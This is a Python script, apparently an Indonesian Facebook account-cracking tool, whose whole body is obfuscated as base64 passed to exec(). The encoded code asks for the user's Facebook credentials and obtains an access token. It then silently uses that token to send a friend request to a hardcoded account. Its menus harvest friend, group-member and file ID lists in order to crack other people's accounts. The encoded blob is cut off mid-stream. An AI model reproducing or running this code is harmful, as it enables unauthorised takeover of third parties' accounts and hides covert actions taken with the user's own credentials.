import base64
exec(base64.b64decode('aW1wb3J0IG9zLHN5cyx0aW1lLGRhdGV0aW1lLHJhbmRvbSxoYXNobGliLHJlLHRocmVhZGluZyxq
c29uLHVybGxpYixjb29raWVsaWIscmVxdWVzdHMsbWVjaGFuaXplCmZyb20gbXVsdGlwcm9jZXNz
aW5nLnBvb2wgaW1wb3J0IFRocmVhZFBvb2wKZnJvbSByZXF1ZXN0cy5leGNlcHRpb25zIGltcG9y
dCBDb25uZWN0aW9uRXJyb3IKZnJvbSBtZWNoYW5pemUgaW1wb3J0IEJyb3dzZXIKCgpyZWxvYWQo
c3lzKQpzeXMuc2V0ZGVmYXVsdGVuY29kaW5nKCd1dGY4JykKYnIgPSBtZWNoYW5pemUuQnJvd3Nl
cigpCmJyLnNldF9oYW5kbGVfcm9ib3RzKEZhbHNlKQpici5zZXRfaGFuZGxlX3JlZnJlc2gobWVj
aGFuaXplLl9odHRwLkhUVFBSZWZyZXNoUHJvY2Vzc29yKCksbWF4X3RpbWU9MSkKYnIuYWRkaGVh
ZGVycyA9IFsoJ1VzZXItQWdlbnQnLCAnT3BlcmEvOS44MCAoQW5kcm9pZDsgT3BlcmEgTWluaS8z
Mi4wLjIyNTQvODUuIFU7IGlkKSBQcmVzdG8vMi4xMi40MjMgVmVyc2lvbi8xMi4xNicpXQoKCmRl
ZiBrZWx1YXIoKToKCXByaW50ICJcMDMzWzE7OTZtWyFdIFx4MWJbMTs5MW1FeGl0IgoJb3Muc3lz
LmV4aXQoKQoJCgkKZGVmIGFjYWsoeCk6CiAgICB3ID0gJ21oa2JwY1AnCiAgICBkID0gJycKICAg
IGZvciBpIGluIHg6CiAgICAgICAgZCArPSAnIScrd1tyYW5kb20ucmFuZGludCgwLGxlbih3KS0x
KV0raQogICAgcmV0dXJuIGNldGFrKGQpCiAgICAKICAgIApkZWYgY2V0YWsoeCk6CiAgICB3ID0g
J21oa2JwY1AnCiAgICBmb3IgaSBpbiB3OgogICAgICAgIGogPSB3LmluZGV4KGkpCiAgICAgICAg
eD0geC5yZXBsYWNlKCchJXMnJWksJ1wwMzNbJXM7MW0nJXN0cigzMStqKSkKICAgIHggKz0gJ1ww
MzNbMG0nCiAgICB4ID0geC5yZXBsYWNlKCchMCcsJ1wwMzNbMG0nKQogICAgc3lzLnN0ZG91dC53
cml0ZSh4KydcbicpCgkKCmRlZiBqYWxhbih6KToKCWZvciBlIGluIHogKyAnXG4nOgoJCXN5cy5z
dGRvdXQud3JpdGUoZSkKCQlzeXMuc3Rkb3V0LmZsdXNoKCkKCQl0aW1lLnNsZWVwKDAuMDUpCgkJ
CmxvZ28gPSAiIFxuXDAzM1sxOzk3beKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiFxuXDAzM1sx
Ozk3beKWiOKWhOKWiOKWiOKWiOKWiOKWiOKWhOKWiCAgICAgIFwwMzNbMTs5Nm3il4/ilqzilqzi
lqzilqzilqzilqzilqzilqzilqzguZHwn5Sx4LmR4pas4pas4pas4pas4pas4pas4pas4pas4peP
XG5cMDMzWzE7OTdt4paIXDAzM1sxOzkxbeKWvOKWvOKWvOKWvOKWvCBcMDMzWzE7OTdtLSBfIC0t
Xy0tXDAzM1sxOzkybeKVlOKVpuKVl+KUjOKUgOKUkOKUrOKUgOKUkOKUrOKUjOKUgCAgIOKVlOKV
kOKVl+KVlOKVlyBcblwwMzNbMTs5N23iloggXDAzM1sxOzk3bSBcMDMzWzE7OTdtXy1fLS0gLV8g
LS1fX1wwMzNbMTs5Mm0g4pWR4pWR4pSc4pSA4pSk4pSc4pSs4pSY4pSc4pS04pSQ4pSA4pSA4pSA
4pWg4pWjIOKVoOKVqeKVl1xuXDAzM1sxOzk3beKWiFwwMzNbMTs5MW3ilrLilrLilrLilrLilrJc
MDMzWzE7OTdtLS0gIC0gXyAtLVwwMzNbMTs5Mm3ilZDilanilZ3ilLQg4pS04pS04pSU4pSA4pS0
IOKUtCAgIOKVmiAg4pWa4pWQ4pWdIFwwMzNbMTs5M21FTElURSB2MS4yXG5cMDMzWzE7OTdt4paI
4paI4paI4paI4paI4paI4paI4paI4paIICAgICAgXDAzM1sxOzk2beKXj+KWrOKWrOKWrOKWrOKW
rOKWrOKWrOKWrOKWrOC5kfCflLHguZHilqzilqzilqzilqzilqzilqzilqzilqzil49cblwwMzNb
MTs5N20g4paI4paIIOKWiOKWiFxuXDAzM1sxOzk3beKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVl1xuXDAzM1sxOzk3beKV
kVwwMzNbMTs5M20qIFwwMzNbMTs5N21BdXRob3IgIFwwMzNbMTs5MW06IFwwMzNbMTs5Nm1EdnMg
XDAzM1sxOzk3bSAgICAgICAgICAgICAgICAgICAg4pWRXG5cMDMzWzE7OTdt4pWRXDAzM1sxOzkz
bSogXDAzM1sxOzk3bUdpdGh1YiAgXDAzM1sxOzkxbTogXDAzM1sxOzk2bVNlZGFuZ0RpQnVhdDAz
M1sxOzk3bSAgIOKVkVxuXDAzM1sxOzk3beKVkVwwMzNbMTs5M20qIFwwMzNbMTs5N21GQiAgICAg
IFwwMzNbMTs5MW06IFwwMzNbMTs5Mm1cMDMzWzRtaHR0cHM6Ly9mYi5tZS9kYXZpZGdhbnRlbmdo
ZWhlXDAzM1swbSAgIFwwMzNbMTs5N23ilZFcblwwMzNbMTs5N23ilZFcMDMzWzE7OTNtKiBcMDMz
WzE7OTdtVmVyc2lvbiBcMDMzWzE7OTFtOiBcMDMzWzE7OTJtXDAzM1s0bTEuMlwwMzNbMG0gICAg
ICAgICAgICAgICAgICAgICAgICAgXDAzM1sxOzk3beKVkVxuXDAzM1sxOzk3beKVmuKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
nSIgICdcblwwMzNbMTszM21b4pyTXSBTaWxhaGthbiBMb2dpbiBPcGVyYW1pbmkgQWdhciBUaWRh
ayBDaGVja3BvaW50XG4nCgpkZWYgdGlrKCk6Cgl0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4g
J10KCWZvciBvIGluIHRpdGlrOgoJCXByaW50KCJcclwwMzNbMTs5Nm1b4pePXSBceDFiWzE7OTNt
U2VkYW5nIExvZ2luIFx4MWJbMTs5N20iK28pLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVl
cCgxKQoKCmJhY2sgPSAwCnRocmVhZHMgPSBbXQpiZXJoYXNpbCA9IFtdCmNla3BvaW50ID0gW10K
b2tzID0gW10KaWQgPSBbXQpsaXN0Z3J1cCA9IFtdCnZ1bG5vdCA9ICJcMDMzWzMxbU5vdCBWdWxu
Igp2dWxuID0gIlwwMzNbMzJtVnVsbiIKCmRlZiBzaWFwYSgpOgoJb3Muc3lzdGVtKCdjbGVhcicp
CgluYW1hID0gcmF3X2lucHV0KCJcMDMzWzE7OTdtSW5wdXQgWW91ciBOYW1lISBcMDMzWzE7OTFt
OiBcMDMzWzE7OTJtIikKCWlmIG5hbWEgPT0iIjoKCQlwcmludCJcMDMzWzE7OTZtWyFdIFwwMzNb
MTs5MW1Jc2kgeWFuZyBiZW5hciIKCQl0aW1lLnNsZWVwKDEpCgkJc2lhcGEoKQoJZWxzZToKCQlv
cy5zeXN0ZW0oJ2NsZWFyJykKCQlqYWxhbigiXDAzM1sxOzk3bVNlbGFtYXQgRGF0YW5nIFwwMzNb
MzE7MW0iICtuYW1hICsgIlxuXDAzM1sxOzk3bU1vaG9uIEd1bmFrYW4gU2NyaXB0IEluaSBEZW5n
YW4gQmlqYWshIikKCQl0aW1lLnNsZWVwKDIpCgkJbG9naW5TQygpCgkJCgkJCmRlZiBsb2dpblND
KCk6Cglvcy5zeXN0ZW0oJ2NsZWFyJykKCXByaW50IlwwMzNbMzM7MW0qQmFjYSBTZWJlbHVtIE1l
bmdndW5ha2FuISFcblNlYmVsdW0gS2FsaWFuIERhcGF0IE1lbmdndW5ha2FuIFNjcmlwdCBJbmkg
TWFrYSBcbkthbGlhbiBIYXJ1cyBNZW1hc3VrYW4gVXNlcm5hbWUgZGFuIFBhc3N3b3JkIFRlcmxl
YmloIFxuRGFodWx1ISxKaWthIEthbGlhbiBUaWRhayBNZW1wdW55YWkvTWVuZ2V0YWh1aSBcblVz
ZXJuYW1lIGRhbiBQYXNzd29yZG55YSwgU2lsYWhrYW4gQ2hhdFxuRGFodWx1IGRpIFdlYnNpdGUg
WWFuZyBCYXJ1c2FuIGRpIEFsaWhrYW4gT3RvbWF0aXMuXG4iCglvcy5zeXN0ZW0oJ3hkZy1vcGVu
IGh0dHBzOi8vZmIubWUvZGF2aWRnYW50ZW5naGVoZScpCiAgICAgICAgdXNlcm5hbWUgPSByYXdf
aW5wdXQoIlwwMzNbMTs5Nm1bKl0gXDAzM1sxOzk3bVVzZXJuYW1lIFwwMzNbMTs5MW06IFwwMzNb
MTs5Mm0iKQoJcGFzc3dvcmQgPSByYXdfaW5wdXQoIlwwMzNbMTs5Nm1bKl0gXDAzM1sxOzk3bVBh
c3N3b3JkIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0iKQoJaWYgdXNlcm5hbWUgPT0iZHZzIiBhbmQg
cGFzc3dvcmQgPT0ic3NiIjoKCQlwcmludCJcMDMzWzE7OTZtW+Kck10gXDAzM1sxOzkybUxvZ2lu
IFN1Y2Nlc3MiCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCWVsc2U6CgkJcHJpbnQiXDAzM1sx
Ozk2bVshXSBcMDMzWzE7OTFtU2FsYWghISIKCQlvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8v
ZmIubWUvZGF2aWRnYW50ZW5naGVoZScpCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEpCiAg
ICAgICAgICAgICAgICBMb2dpblNDKCkKCmRlZiBsb2dpbigpOgoJb3Muc3lzdGVtKCdjbGVhcicp
Cgl0cnk6CgkJdG9rZXQgPSBvcGVuKCdsb2dpbi50eHQnLCdyJykKCQltZW51KCkgCglleGNlcHQg
KEtleUVycm9yLElPRXJyb3IpOgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlw
cmludCA0MioiXDAzM1sxOzk2bT0iCgkJcHJpbnQoJ1wwMzNbMTs5Nm1b4piGXSBceDFiWzE7OTNt
U0lMQUhLQU4gTE9HSU4gQUtVTiBGQUNFQk9PSyBBTkRBIFx4MWJbMTs5Nm1b4piGXScgKQoJCWlk
ID0gcmF3X2lucHV0KCdcMDMzWzE7OTZtWytdIFx4MWJbMTs5M21JRC9FbWFpbCBceDFiWzE7OTFt
OiBceDFiWzE7OTJtJykKCQlwd2QgPSByYXdfaW5wdXQoJ1wwMzNbMTs5Nm1bK10gXHgxYlsxOzkz
bVBhc3N3b3JkIFx4MWJbMTs5MW06IFx4MWJbMTs5Mm0nKQoJCXRpaygpCgkJdHJ5OgoJCQlici5v
cGVuKCdodHRwczovL2ZyZWUuZmFjZWJvb2suY29tJykKCQlleGNlcHQgbWVjaGFuaXplLlVSTEVy
cm9yOgoJCQlwcmludCJcblwwMzNbMTs5Nm1bIV0gXHgxYlsxOzkxbVRpZGFrIGFkYSBrb25la3Np
IgoJCQlrZWx1YXIoKQoJCWJyLl9mYWN0b3J5LmlzX2h0bWwgPSBUcnVlCgkJYnIuc2VsZWN0X2Zv
cm0obnI9MCkKCQlici5mb3JtWydlbWFpbCddID0gaWQKCQlici5mb3JtWydwYXNzJ10gPSBwd2QK
CQlici5zdWJtaXQoKQoJCXVybCA9IGJyLmdldHVybCgpCgkJaWYgJ3NhdmUtZGV2aWNlJyBpbiB1
cmw6CgkJCXRyeToKCQkJCXNpZz0gJ2FwaV9rZXk9ODgyYTg0OTAzNjFkYTk4NzAyYmY5N2EwMjFk
ZGMxNGRjcmVkZW50aWFsc190eXBlPXBhc3N3b3JkZW1haWw9JytpZCsnZm9ybWF0PUpTT05nZW5l
cmF0ZV9tYWNoaW5lX2lkPTFnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MWxvY2FsZT1lbl9VU21l
dGhvZD1hdXRoLmxvZ2lucGFzc3dvcmQ9Jytwd2QrJ3JldHVybl9zc2xfcmVzb3VyY2VzPTB2PTEu
MDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJwoJCQkJZGF0YSA9IHsiYXBpX2tleSI6
Ijg4MmE4NDkwMzYxZGE5ODcwMmJmOTdhMDIxZGRjMTRkIiwiY3JlZGVudGlhbHNfdHlwZSI6InBh
c3N3b3JkIiwiZW1haWwiOmlkLCJmb3JtYXQiOiJKU09OIiwgImdlbmVyYXRlX21hY2hpbmVfaWQi
OiIxIiwiZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzIjoiMSIsImxvY2FsZSI6ImVuX1VTIiwibWV0
aG9kIjoiYXV0aC5sb2dpbiIsInBhc3N3b3JkIjpwd2QsInJldHVybl9zc2xfcmVzb3VyY2VzIjoi
MCIsInYiOiIxLjAifQoJCQkJeD1oYXNobGliLm5ldygibWQ1IikKCQkJCXgudXBkYXRlKHNpZykK
CQkJCWE9eC5oZXhkaWdlc3QoKQoJCQkJZGF0YS51cGRhdGUoeydzaWcnOmF9KQoJCQkJdXJsID0g
Imh0dHBzOi8vYXBpLmZhY2Vib29rLmNvbS9yZXN0c2VydmVyLnBocCIKCQkJCXI9cmVxdWVzdHMu
Z2V0KHVybCxwYXJhbXM9ZGF0YSkKCQkJCXo9anNvbi5sb2FkcyhyLnRleHQpCgkJCQl1bmlrZXJz
ID0gb3BlbigibG9naW4udHh0IiwgJ3cnKQoJCQkJdW5pa2Vycy53cml0ZSh6WydhY2Nlc3NfdG9r
ZW4nXSkKCQkJCXVuaWtlcnMuY2xvc2UoKQoJCQkJcHJpbnQgJ1xuXDAzM1sxOzk2bVvinJNdIFx4
MWJbMTs5Mm1Mb2dpbiBTdWNjZXMnCgkJCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZh
Y2Vib29rLmNvbS9tZS9mcmllbmRzP21ldGhvZD1wb3N0JnVpZHM9Z3dpbXVzYTMmYWNjZXNzX3Rv
a2VuPScrelsnYWNjZXNzX3Rva2VuJ10pCgkJCQlvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8v
d3d3LmZhY2Vib29rLmNvbS9kYXZpZGdhbnRlbmdoZWhlJykKCQkJCW1lbnUoKQoJCQlleGNlcHQg
cmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJCQlwcmludCJcblwwMzNbMTs5
Nm1bIV0gXHgxYlsxOzkxbVRpZGFrIEFkYSBLb25la3NpIgoJCQkJa2VsdWFyKCkKCQlpZiAnY2hl
Y2twb2ludCcgaW4gdXJsOgoJCQlwcmludCgiXG5cMDMzWzE7OTZtWyFdIFx4MWJbMTs5MW1TZXBl
cnRpbnlhIEFrdW4gQW5kYSBLZW5hIENoZWNrcG9pbnQiKQoJCQlvcy5zeXN0ZW0oJ3hkZy1vcGVu
IGh0dHBzOi8vc2FmZWt1LmNvbS85T3YxMnZ2MScpCgkJCXRpbWUuc2xlZXAoMSkKCQkJa2VsdWFy
KCkKCQllbHNlOgoJCQlwcmludCgiXG5cMDMzWzE7OTZtWyFdIFx4MWJbMTs5MW1QYXNzd29yZC9F
bWFpbCBzYWxhaCIpCgkJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJCXRpbWUuc2xl
ZXAoMSkKCQkJbG9naW4oKQoJCQkKCQkJCmRlZiBtZW51KCk6Cglvcy5zeXN0ZW0oJ2NsZWFyJykK
CXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJv
cjoKCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQlwcmludCJcMDMzWzE7OTZtWyFdIFx4MWJbMTs5MW1U
b2tlbiBpbnZhbGlkIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVl
cCgxKQoJCWtlbHVhcigpCgl0cnk6CgkJb3R3ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBo
LmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQlhID0ganNvbi5sb2Fkcyhv
dHcudGV4dCkKCQluYW1hID0gYVsnbmFtZSddCgkJaWQgPSBhWydpZCddCglleGNlcHQgS2V5RXJy
b3I6CgkJb3Muc3lzdGVtKCdjbGVhcicpCgkJcHJpbnQiXDAzM1sxOzk2bVshXSBcMDMzWzE7OTFt
VG9rZW4gaW52YWxpZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xl
ZXAoMSkKCQlsb2dpbigpCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJy
b3I6CgkJcHJpbnQiXDAzM1sxOzk2bVshXSBceDFiWzE7OTFtVGlkYWsgQWRhIEtvbmVrc2kiCgkJ
a2VsdWFyKCkKCW9zLnN5c3RlbSgiY2xlYXIiKQoJcHJpbnQgbG9nbwoJcHJpbnQgNDIqIlwwMzNb
MTs5Nm09IgoJcHJpbnQgIlwwMzNbMTs5Nm1bXDAzM1sxOzk3beKck1wwMzNbMTs5Nm1dXDAzM1sx
OzkzbSBOYW1hIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0iK25hbWErIlwwMzNbMTs5N20gICAgICAg
ICAgICAgICAgICAiCglwcmludCAiXDAzM1sxOzk2bVtcMDMzWzE7OTdt4pyTXDAzM1sxOzk2bV1c
MDMzWzE7OTNtIElEICAgXDAzM1sxOzkxbTogXDAzM1sxOzkybSIraWQrIlx4MWJbMTs5N20gICAg
ICAgICAgICAgICIKCXByaW50IDQyKiJcMDMzWzE7OTZtPSIKCXByaW50ICJcMDMzWzE7OTdt4pWR
LS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS5cMDMzWzE7OTdtIEhhY2sgRmFjZWJvb2siCglwcmlu
dCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTIuXDAzM1sxOzk3bSBMaWhh
dCBEYWZ0YXIgR3J1cCIKICAgICAgICBwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4g
XDAzM1sxOzkybTMuXDAzM1sxOzk3bSBJbmZvcm1hc2kgQWt1biIKICAgICAgICBwcmludCAiXDAz
M1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTQuXDAzM1sxOzk3bSBZYWhvbyBDbG9u
ZSIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7
OTdtIExvZ291dCIKCXBpbGloKCkKCgpkZWYgcGlsaWgoKToKCXVuaWtlcnMgPSByYXdfaW5wdXQo
IlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtPj4+IFwwMzNbMTs5N20iKQoJaWYgdW5pa2VycyA9
PSIiOgoJCXByaW50ICJcMDMzWzE7OTZtWyFdIFx4MWJbMTs5MW1Jc2kgeWFuZyBiZW5hciIKCQlw
aWxpaCgpCgllbGlmIHVuaWtlcnMgPT0iMSI6CgkJc3VwZXIoKQoJZWxpZiB1bmlrZXJzID09IjIi
OgoJCWdydXBzYXlhKCkKCWVsaWYgdW5pa2VycyA9PSIzIjoKCQlpbmZvcm1hc2koKQoJZWxpZiB1
bmlrZXJzID09IjQiOgoJCXlhaG9vKCkKCWVsaWYgdW5pa2VycyA9PSIwIjoKCQlvcy5zeXN0ZW0o
J2NsZWFyJykKCQlqYWxhbignTWVuZ2hhcHVzIHRva2VuJykKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBs
b2dpbi50eHQnKQoJCWtlbHVhcigpCgllbHNlOgoJCXByaW50ICJcMDMzWzE7OTZtWyFdIFx4MWJb
MTs5MW1Jc2kgeWFuZyBiZW5hciIKCQlwaWxpaCgpCgkJCgkJCmRlZiBzdXBlcigpOgoJZ2xvYmFs
IHRva2V0Cglvcy5zeXN0ZW0oJ2NsZWFyJykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQn
LCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTZtWyFdIFx4MWJb
MTs5MW1Ub2tlbiBpbnZhbGlkIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGlt
ZS5zbGVlcCgxKQoJCWtlbHVhcigpCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXByaW50IGxvZ28KCXBy
aW50IDQyKiJcMDMzWzE7OTZtPSIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBc
MDMzWzE7OTJtMS5cMDMzWzE7OTdtIENyYWNrIERhcmkgRGFmdGFyIFRlbWFuIgoJcHJpbnQgIlww
MzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLlwwMzNbMTs5N20gQ3JhY2sgRGFy
aSBUZW1hbiBEYXJpIFRlbWFuIgogICAgICAgIHByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7
OTFtPiBcMDMzWzE7OTJtMy5cMDMzWzE7OTdtIENyYWNrIERhcmkgVGVtYW4gTWVtYmVyIEdydXAi
CiAgICAgICAgcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm00Llww
MzNbMTs5N20gQ3JhY2sgRGFyaSBGaWxlIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5
MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gS2VtYmFsaSIKCXBpbGloX3N1cGVyKCkKCmRlZiBw
aWxpaF9zdXBlcigpOgoJcGVhayA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5
MW0+Pj4gXDAzM1sxOzk3bSIpCglpZiBwZWFrID09IiI6CgkJcHJpbnQgIlwwMzNbMTs5Nm1bIV0g
XHgxYlsxOzkxbUlzaSB5YW5nIGJlbmFyIgoJCXBpbGloX3N1cGVyKCkKCWVsaWYgcGVhayA9PSIx
IjoKCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQlwcmludCBsb2dvCgkJcHJpbnQgNDIqIlwwMzNbMTs5
Nm09IgoJCWphbGFuKCdcMDMzWzE7OTZtW+Kck10gXDAzM1szMjsxbU1lbmdhbWJpbCBJRCBcMDMz
WzE7OTdtLi4uJykKCQlyID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNv
bS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCXogPSBqc29uLmxvYWRzKHIudGV4
dCkKCQlmb3IgcyBpbiB6WydkYXRhJ106CgkJCWlkLmFwcGVuZChzWydpZCddKQoJZWxpZiBwZWFr
ID09IjIiOgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlwcmludCA0MioiXDAz
M1sxOzk2bT0iCgkJaWR0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTZtWytdIFwwMzNbMzI7MW1NYXN1
a2FuIElEIHRlbWFuIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iKQoJCXRyeToKCQkJam9rID0gcmVx
dWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiP2FjY2Vzc190b2tl
bj0iK3Rva2V0KQoJCQlvcCA9IGpzb24ubG9hZHMoam9rLnRleHQpCgkJCXByaW50IlwwMzNbMTs5
Nm1bXDAzM1sxOzk3beKck1wwMzNbMTs5Nm1dIFwwMzNbMzI7MW1OYW1hIHRlbWFuXDAzM1sxOzkx
bSA6XDAzM1swOzFtICIrb3BbIm5hbWUiXQoJCWV4Y2VwdCBLZXlFcnJvcjoKCQkJcHJpbnQiXDAz
M1sxOzk2bVshXSBceDFiWzE7OTFtVGVtYW4gdGlkYWsgZGl0ZW11a2FuISIKCQkJcmF3X2lucHV0
KCJcblwwMzNbMTs5Nm1bXDAzM1sxOzk3bUtlbWJhbGlcMDMzWzE7OTZtXSIpCgkJCXN1cGVyKCkK
CQlqYWxhbignXDAzM1sxOzk2bVvinJNdIFwwMzNbMzI7MW1NZW5nYW1iaWwgSUQgXDAzM1sxOzk3
bS4uLicpCgkJciA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitp
ZHQrIi9mcmllbmRzP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCXogPSBqc29uLmxvYWRzKHIudGV4
dCkKCQlmb3IgaSBpbiB6WydkYXRhJ106CgkJCWlkLmFwcGVuZChpWydpZCddKQoJZWxpZiBwZWFr
ID09IjMiOgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlwcmludCA0MioiXDAz
M1sxOzk2bT0iCgkJaWRnPXJhd19pbnB1dCgnXDAzM1sxOzk2bVsrXSBcMDMzWzE7OTNtTWFzdWth
biBJRCBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykKCQl0cnk6CgkJCXI9cmVxdWVzdHMu
Z2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncm91cC8/aWQ9JytpZGcrJyZhY2Nlc3Nf
dG9rZW49Jyt0b2tldCkKCQkJYXN3PWpzb24ubG9hZHMoci50ZXh0KQoJCQlwcmludCJcMDMzWzE7
OTZtW1wwMzNbMTs5N23inJNcMDMzWzE7OTZtXSBcMDMzWzE7OTNtTmFtYSBncm91cCBcMDMzWzE7
OTFtOlwwMzNbMTs5N20gIithc3dbJ25hbWUnXQoJCWV4Y2VwdCBLZXlFcnJvcjoKCQkJcHJpbnQi
XDAzM1sxOzk2bVshXSBceDFiWzE7OTFtR3JvdXAgdGlkYWsgZGl0ZW11a2FuIgoJCQlyYXdfaW5w
dXQoIlxuXDAzM1sxOzk2bVtcMDMzWzE7OTdtS2VtYmFsaVwwMzNbMTs5Nm1dIikKCQkJc3VwZXIo
KQoJCWphbGFuKCdcMDMzWzE7OTZtW+Kcul0gXDAzM1sxOzkzbU1lbmdhbWJpbCBJRCBcMDMzWzE7
OTdtLi4uJykKCQlyZT1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycr
aWRnKycvbWVtYmVycz9maWVsZHM9bmFtZSxpZCZsaW1pdD05OTk5OTk5OTkmYWNjZXNzX3Rva2Vu
PScrdG9rZXQpCgkJcz1qc29uLmxvYWRzKHJlLnRleHQpCgkJZm9yIHAgaW4gc1snZGF0YSddOgoJ
CQlpZC5hcHBlbmQocFsnaWQnXSkKCWVsaWYgcGVhayA9PSI0IjoKCQlvcy5zeXN0ZW0oJ2NsZWFy
JykKCQlwcmludCBsb2dvCgkJcHJpbnQgNDIqIlwwMzNbMTs5Nm09IgoJCXRyeToKCQkJaWRsaXN0
ID0gcmF3X2lucHV0KCdceDFiWzE7OTZtWytdIFx4MWJbMTs5M21NYXN1a2FuIG5hbWEgZmlsZSAg
XHgxYlsxOzkxbTogXHgxYlsxOzk3bScpCgkJCWZvciBsaW5lIGluIG9wZW4oaWRsaXN0LCdyJyku
cmVhZGxpbmVzKCk6CgkJCQlpZC5hcHBlbmQobGluZS5zdHJpcCgpKQoJCWV4Y2VwdCBJT0Vycm9y
OgoJCQlwcmludCAnXHgxYlsxOzk2bVshXSBceDFiWzE7OTFtRmlsZSB0aWRhayBkaXRlbXVrYW4n
CgkJCXJhd19pbnB1dCgnXG5ceDFiWzE7OTZtWyBceDFiWzE7OTdtS2VtYmFsaSBceDFiWzE7OTZt
XScpCgkJCXN1cGVyKCkKCWVsaWYgcGVhayA9PSIwIjoKCQltZW51KCkKCWVsc2U6CgkJcHJpbnQg
IlwwMzNbMTs5Nm1bIV0gXHgxYlsxOzkxbUlzaSB5YW5nIGJlbmFyIgoJCXBpbGloX3N1cGVyKCkK
CQoJcHJpbnQgIlwwMzNbMTs5Nm1bK10gXDAzM1szMjsxbVRvdGFsIElEIFwwMzNbMTs5MW06IFww
MzNbMDsxbSIrc3RyKGxlbihpZCkpCgl0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJ10KCWZv
ciBvIGluIHRpdGlrOgoJCXByaW50KCJcclwwMzNbMTs5Nm1bXDAzM1sxOzk3beKck1wwMzNbMTs5
Nm1dIFwwMzNbMzI7MW1DcmFjayBcMDMzWzE7OTdtIitvKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3Rp
bWUuc2xlZXAoMSkKCXByaW50CglwcmludCgnXHgxYlsxOzk2bVshXSBceDFiWzA7MW1TYWJhciBP
bSxPcmFuZyBTYWJhciBEaSBTYXlhbmcgSmFuZGEnKQoJcHJpbnQgNDIqIlwwMzNbMTs5Nm09IgoJ
